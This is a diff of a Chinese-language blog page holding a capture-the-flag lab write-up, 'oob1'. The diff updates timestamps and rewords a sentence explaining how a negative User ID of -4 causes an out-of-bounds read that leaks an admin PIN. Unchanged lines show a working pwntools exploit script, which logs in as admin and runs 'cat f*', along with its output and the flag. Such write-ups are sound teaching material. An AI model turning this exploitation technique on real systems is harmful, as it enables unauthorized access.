@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://kazma.tw/images/oob1_key.png">
 <meta property="og:image" content="https://kazma.tw/images/oob1_pass.png">
 <meta property="article:published_time" content="2024-01-16T17:04:53.000Z">
-<meta property="article:modified_time" content="2024-01-16T17:39:20.211Z">
+<meta property="article:modified_time" content="2024-01-16T18:09:04.766Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="writeup">
 <meta property="article:tag" content="lab">
@@ -412,8 +412,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-01-17 01:39:20</span>
-            <span class="mobile">2024-01-17 01:39:20</span>
+            <span class="desktop">2024-01-17 02:09:04</span>
+            <span class="mobile">2024-01-17 02:09:04</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -480,7 +480,7 @@
                      data-src="/../images/oob1_pass.png"
                       alt="pass"
                 ></p>
-<p>從上面可以找到 obj.pincode 在 0x6010a0，跟 obj.user 差 0x20，又原本的功能是要取其他 username 所以 rax 會左移三個 bits，也就是乘以 8，故 User ID 輸入 -4 可以 oob read 我們想要的東西，然後 information leak 完之後再把結果收回來整理一下登入 admin 即可走到 win func，exploit 如下：</p>
+<p>從上面可以找到 obj.pincode 在 0x6010a0，跟 obj.user 差 0x20，又原本的功能是要取其他 username 所以 rax 會左移三個 bits，也就是乘以 8，故 User ID 輸入 -4 可以 oob read 我們想要的東西，然後 information leak 完之後再把結果吃回來整理一下，登入 admin 即可走到 win func，exploit 如下：</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./oob1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;-4&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1234&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">pin = u32(r.recvuntil(<span class="string">&quot;]&quot;</span>)[:-<span class="number">1</span>][:<span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pin: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(pin))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 <p>Result:</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./oob1&#x27;</span>: pid 2841934</span><br><span class="line">pin: 151386595</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Logging to [admin] ... Ok!</span><br><span class="line"></span><br><span class="line">BreakALLCTF&#123;CPuPeMrhVrWWx2XueaIr&#125;</span><br></pre></td></tr></table></figure></div>
@@ -498,7 +498,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-01-17 01:39:20
+                    :</strong> 2024-01-17 02:09:04
             </li>
         
         <li>
